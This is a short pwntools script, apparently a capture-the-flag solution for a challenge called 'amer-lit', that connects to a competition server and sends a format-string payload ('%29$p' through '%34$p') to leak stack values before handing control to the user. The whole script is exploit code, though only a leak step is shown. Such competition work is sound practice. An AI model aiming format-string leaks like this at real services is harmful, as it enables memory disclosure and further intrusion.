from pwn import *

exe = ELF("./amer-lit_patched")
context.binary = exe

def conn():
    r = process([exe.path])
    return r

def main():
    r =remote("bin.bcactf.com", 49157)    
    pause()
    r.sendline("%29$p%30$p%31$p%32$p%33$p%34$p")
    r.interactive()


if __name__ == "__main__":
    main()
